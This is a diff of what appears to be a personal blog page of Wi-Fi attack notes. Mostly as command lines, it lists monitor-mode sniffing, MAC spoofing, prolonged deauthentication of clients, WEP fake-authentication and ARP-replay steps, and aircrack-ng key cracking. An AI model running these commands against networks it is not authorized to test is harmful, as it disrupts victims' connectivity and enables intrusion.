@@ -14,7 +14,7 @@ iwconfig wlan0 mode monitor
 ifconfig wlan0 up
 iwconfig ( to check)
 network preconnection attack.txt note: need monitor mode on
-airodump-ng wlan0 ( discover all wireless network and info around it) *sniff and discover 5Ghz networks
+airodump-ng wlan0 ( discover all wireless network and info around it) sniff and discover 5Ghz networks
 " />
 <meta name="keywords" content="" />
 
@@ -98,7 +98,7 @@ iwconfig wlan0 mode monitor
 ifconfig wlan0 up
 iwconfig ( to check)
 network preconnection attack.txt note: need monitor mode on
-airodump-ng wlan0 ( discover all wireless network and info around it) *sniff and discover 5Ghz networks
+airodump-ng wlan0 ( discover all wireless network and info around it) sniff and discover 5Ghz networks
 " />
 <meta property="og:url" content="/posts/blog-5-cyber-atk-cmds/" />
 <meta property="og:site_name" content="Terminal" />
@@ -209,7 +209,7 @@ airodump-ng wlan0 ( discover all wireless network and info around it) *sniff and
 <p>*note: its my personal research so there can be errors or more fast and powerful method to do same attacks</p>
 <hr>
 <h1 id="packet-sniffing--airodump-ng-monitor-mode-interface">packet sniffing : airodump-ng [monitor mode interface]<a href="#packet-sniffing--airodump-ng-monitor-mode-interface" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<p>first enable monitor mode; then</p>
+<p><em>first enable monitor mode; then</em></p>
 <ul>
 <li>
 <p>ifconfig wlan0 down</p>
@@ -229,25 +229,25 @@ airodump-ng wlan0 ( discover all wireless network and info around it) *sniff and
 </ul>
 <hr>
 <h1 id="network-preconnection-attacktxt">network preconnection attack.txt<a href="#network-preconnection-attacktxt" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<p>note: need monitor mode on</p>
+<p><em>note: need monitor mode on</em></p>
 <ul>
 <li>airodump-ng wlan0 ( discover all wireless network and info around it)</li>
 </ul>
-<p>*sniff and discover 5Ghz networks</p>
+<p><em>sniff and discover 5Ghz networks</em></p>
 <ul>
 <li>airodump-ng &ndash;band a wlan0  (a = 5Ghz)</li>
 </ul>
-<p>*for sniffing multiple bands ( 2.4 &amp; 5)</p>
+<p><em>for sniffing multiple bands ( 2.4 &amp; 5)</em></p>
 <ul>
 <li>airodump-ng &ndash;band abg wlan0  ( all frequency)</li>
 </ul>
-<p>*to siff only target network</p>
+<p>*to siff only target network **</p>
 <ul>
 <li>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X &ndash;write test wlan0</li>
 </ul>
-<p>{ &ldquo;channel&rdquo; for airodump-ng to sniff on and &ldquo;write&rdquo; for storing data in file (xxxx.cap)}</p>
+<p>{ <em>&ldquo;channel&rdquo; for airodump-ng to sniff on and &ldquo;write&rdquo; for storing data in file</em> (xxxx.cap)}</p>
 <ul>
-<li>wireshark ( to lauch wireshark or can open manually to check the xxxx.cap file filled with target data)</li>
+<li>wireshark ( <em>to lauch wireshark or can open manually to check the xxxx.cap file filled with target data</em>)</li>
 </ul>
 <hr>
 <h1 id="change-your-mac-adresss">change your mac adresss:<a href="#change-your-mac-adresss" class="hanchor" ariaLabel="Anchor">#</a> </h1>
@@ -256,55 +256,53 @@ airodump-ng wlan0 ( discover all wireless network and info around it) *sniff and
 <p>ifconfig wlan0 down (to make wlan0 down)</p>
 </li>
 <li>
-<p>ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX ( random mac address)</p>
+<p>ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX ( <em>random mac address</em>)</p>
 </li>
 <li>
-<p>ifconfig wlan0 up (to make wlan0 up again)</p>
+<p>ifconfig wlan0 up (<em>to make wlan0 up again</em>)</p>
 </li>
 <li>
-<p>ifconfig ( to check )</p>
+<p>ifconfig ( *to check *)</p>
 </li>
 </ul>
 <hr>
 <h1 id="deauthentication-attack--disconnect-any-client-form-any-network">deauthentication attack ( disconnect any client form any network)<a href="#deauthentication-attack--disconnect-any-client-form-any-network" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <ul>
+<li>aireplay-ng &ndash;deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]</li>
+</ul>
+<p><em>run airodump-ng in parallel terminal against the target network</em></p>
+<ul>
 <li>
-<p>aireplay-ng &ndash;deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]</p>
-</li>
-<li>
-<p>run airodump-ng in parallel terminal against the target network</p>
-</li>
-<li>
-<p>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X wlan0 ( no need of &ndash;write if u dont want file)</p>
+<p>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X wlan0 (<em>no need of &ndash;write if u dont want file</em>)</p>
 </li>
 <li>
 <p>aireplay-ng &ndash;deauth 100000000 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX  -D wlan0</p>
 </li>
 </ul>
-<p>{ *100000000 give max packets to deauth for long time; &ldquo;-D&rdquo; if client is on 5Ghz network
-and if its in 2.4Ghz then remove the &ldquo;-D&rdquo;}</p>
-<p>*if client still has access to other networks then split the terminal and run same attack parallel on that network</p>
+<p>{ <em>100000000 give max packets to deauth for long time; &ldquo;-D&rdquo; if client is on 5Ghz network
+and if its in 2.4Ghz then remove the &ldquo;-D&rdquo;</em>}</p>
+<p><em>if client still has access to other networks then split the terminal and run same attack parallel on that network</em></p>
 <hr>
 <h1 id="fake-authentication-attack-wep">Fake authentication attack (wep)<a href="#fake-authentication-attack-wep" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<p>forcing AP to generate new packets with new IVs</p>
+<p><em>forcing AP to generate new packets with new IVs</em></p>
 <ul>
 <li>
 <p>aireplay-ng &ndash;fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0</p>
 </li>
 <li>
 <p>airodump-ng &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel x &ndash;write xxxx wlan0
-(sniffing target network with storing data and runnig parallely)</p>
+(<em>sniffing target network with storing data and runnig parallely</em>)</p>
 </li>
 <li>
 <p>aireplay-ng &ndash;fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0
-(0 for doing fake authentication attack once )</p>
+(<em>0 for doing fake authentication attack once</em> )</p>
 </li>
 </ul>
-<p>*running arpreplay attack</p>
+<p><em>running arpreplay attack</em></p>
 <ul>
 <li>aireplay-ng &ndash;arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</li>
 </ul>
-<p>*associate data 1 more time</p>
+<p><em>associate data 1 more time</em></p>
 <ul>
 <li>
 <p>aireplay-ng &ndash;fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</p>
@@ -315,34 +313,34 @@ and if its in 2.4Ghz then remove the &ldquo;-D&rdquo;}</p>
 </ul>
 <hr>
 <h1 id="gainning-access-wep-cracking">Gainning access (wep cracking)<a href="#gainning-access-wep-cracking" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<p>*needs to capture large no. of packets
+<p><em>needs to capture large no. of packets
 iv is too small(24 bits)
-iv is sent in plain text</p>
+iv is sent in plain text</em></p>
 <p><em>to capture large no. of packets/IVs</em>    &mdash;&gt;   using airodump-ng
 <em>to analyse the captured packets/IVs and crack the key</em> &mdash;-&gt; using aircrack-ng</p>
 <p><strong>step1:</strong>
 *wireless adapter in monitor mode</p>
 <ul>
 <li>
-<p>airodump-ng wlan0 (  *discover all wireless network and info around it in parallel terminal)</p>
+<p>airodump-ng wlan0 (  <em>discover all wireless network and info around it in parallel terminal</em>)</p>
 </li>
 <li>
 <p>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X &ndash;write test wlan0<br>
-( *to capture packets of specefic target network and &ldquo;&ndash;write&rdquo; to sotred data in file)</p>
+( <em>to capture packets of specefic target network and &ldquo;&ndash;write&rdquo; to sotred data in file</em>)</p>
 </li>
 </ul>
 <p><strong>step2:</strong></p>
 <ul>
 <li>aircrack-ng xxxx.cap (xxxx.cap = file name)</li>
 </ul>
-<p>*will get key and ascii password, can connect through both and for key remove the colon</p>
+<p><em>will get key and ascii password, can connect through both and for key remove the colon</em></p>
 <hr>
 <h1 id="wpawpa2-cracking">wpa/wpa2 cracking<a href="#wpawpa2-cracking" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p>*both can be cracked using the same methods</p>
 <p>made to adress the issues in wep</p>
 <p>much more secure</p>
 <p>each packet is encrypted using a unique temporary key</p>
-<p>packet contains no useful information</p>
+<p>packet contains no useful information*</p>
 <hr>
 <h1 id="some-links-to-wordlists">some-Links-To-wordlists<a href="#some-links-to-wordlists" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p><strong>Openwall Wordlists</strong><br>
